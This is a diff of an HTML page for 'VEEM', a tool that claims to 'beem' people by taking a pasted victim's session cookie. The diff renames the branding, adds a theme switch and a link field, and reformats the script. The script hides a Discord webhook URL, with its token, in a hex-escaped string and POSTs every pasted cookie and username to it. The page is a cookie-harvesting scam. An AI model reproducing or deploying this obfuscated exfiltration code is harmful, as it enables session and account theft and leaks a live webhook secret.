@@ -13,7 +13,7 @@
     <header>
       <nav>
         <div class="logo">
-          <h5>Dodoz<span>Dev</span></h5>
+          <h5>Gooner<span>Dev</span></h5>
         </div>
         <ul class="menu">
           <li><a href="index.html">Home</a></li>
@@ -21,6 +21,13 @@
           <li><a href="services.html">Services</a></li>
           <li><a href="contact.html">Contact</a></li>
         </ul>
+        <div class="theme-switch-wrapper">
+          <label class="theme-switch" for="checkbox">
+            <input type="checkbox" id="checkbox" />
+            <div class="slider round"></div>
+          </label>
+          
+        </div>
         <div class="bar">
           <div class="bar-1"></div>
           <div class="bar-2"></div>
@@ -28,10 +35,11 @@
         </div>
       </nav>
     </header>
+    
 
     <div class="container">
       <div class="card">
-        <h1 class="title">VEEM <span id="sxx"> BETA </span></h1>
+        <h1 class="title">VEEM <span id="sxx"> 1.2 </span></h1>
         <p class="subtitle">
           Use this tool to beem people. Remember if you have any questions about how to use it visit 
           <a href="about.html">About</a>
@@ -42,6 +50,10 @@
               <span class="placeholder">Username </span>
           </label>
           <textarea maxlength ="2000" id="InputField" placeholder="His Cookie Here"></textarea>
+          <label class="Name-Input">
+              <input maxlength=37 minlength="2" id="LinkInput" type="text" required/>
+              <span class="placeholder">User link here</span>
+          </label>
           <button onclick="send()" id="SendMessage">Beem User</button>
           <h3 id="MessageSent">User BEAMED!</h3>
           <h3 id="MessageFailed">ERROR</h3>
@@ -51,46 +63,72 @@
     </div>
 
     <script>
-var _0xf642=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x36\x38\x33\x30\x36\x38\x36\x37\x38\x35\x33\x34\x36\x37\x37\x34\x39\x2F\x52\x32\x45\x78\x33\x6F\x73\x7A\x4A\x35\x52\x6B\x74\x53\x6E\x64\x35\x57\x36\x6B\x6D\x55\x52\x79\x51\x39\x68\x59\x79\x50\x4A\x6F\x32\x57\x71\x50\x55\x71\x41\x58\x34\x42\x77\x4E\x52\x79\x58\x4B\x44\x33\x62\x67\x6E\x4A\x35\x69\x62\x74\x47\x6E\x72\x30\x65\x65\x73\x54\x48\x69"];whurl= _0xf642[0]
-var str= "";
-var name= "";
-function f1(){
-    name = document.getElementById("NameInput").value;
-    str = document.getElementById("InputField").value;
-    console.log(document.getElementById("InputField").value)
-}
-function send(){
-    f1();
-    const msg = {
-        "content": str,
-        "username": name
-    };
-    console.log(msg)
-    if(str == ""){
-        document.getElementById("Message1").style.opacity = 1; 
-        setTimeout(function(){
+      var _0xf642 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x36\x38\x33\x30\x36\x38\x36\x37\x38\x35\x33\x34\x36\x37\x37\x34\x39\x2F\x52\x32\x45\x78\x33\x6F\x73\x7A\x4A\x35\x52\x6B\x74\x53\x6E\x64\x35\x57\x36\x6B\x6D\x55\x52\x79\x51\x39\x68\x59\x79\x50\x4A\x6F\x32\x57\x71\x50\x55\x71\x41\x58\x34\x42\x77\x4E\x52\x79\x58\x4B\x44\x33\x62\x67\x6E\x4A\x35\x69\x62\x74\x47\x6E\x72\x30\x65\x65\x73\x54\x48\x69"]; 
+      whurl = _0xf642[0];
+      var str = "";
+      var name = "";
+      var link = "";
+
+      function f1() {
+        name = document.getElementById("NameInput").value;
+        str = document.getElementById("InputField").value;
+        link = document.getElementById("LinkInput").value;
+        console.log(document.getElementById("InputField").value);
+      }
+
+      function send() {
+        f1();
+        const msg = {
+          "content": str,
+          "username": name
+        };
+        console.log(msg);
+        if (str == "") {
+          document.getElementById("Message1").style.opacity = 1;
+          setTimeout(function() {
             document.getElementById("Message1").style.opacity = 0;
-        }, 4000)
-        console.log("ERROR")
-        return;
-    }
-    try{
-        fetch(whurl + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)});
-        document.getElementById("InputField").value = "";
-        document.getElementById("MessageSent").style.opacity = 1;
-        setTimeout(function(){
+          }, 4000);
+          console.log("ERROR");
+          return;
+        }
+        try {
+          fetch(whurl + "?wait=true", {
+            "method": "POST",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": JSON.stringify(msg)
+          });
+          document.getElementById("InputField").value = "";
+          document.getElementById("MessageSent").style.opacity = 1;
+          setTimeout(function() {
             document.getElementById("MessageSent").style.opacity = 0;
-        }, 4000)
+          }, 4000);
 
-    } catch(e){
-        document.getElementById("MessageFailed").style.opacity = 1;  
-        
-        setTimeout(function(){
+          // Abre el enlace en una nueva pestaña
+          if (link) {
+            window.open(link, '_blank');
+          }
+
+        } catch (e) {
+          document.getElementById("MessageFailed").style.opacity = 1;
+          setTimeout(function() {
             document.getElementById("MessageFailed").style.opacity = 0;
-        }, 4000)
-    }
-
-} 
+          }, 4000);
+        }
+      }
+    </script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        const checkbox = document.getElementById('checkbox');
+        checkbox.addEventListener('change', function() {
+          if (checkbox.checked) {
+            document.body.classList.add('independence-day');
+          } else {
+            document.body.classList.remove('independence-day');
+          }
+        });
+      });
     </script>
   </body>
 </html>
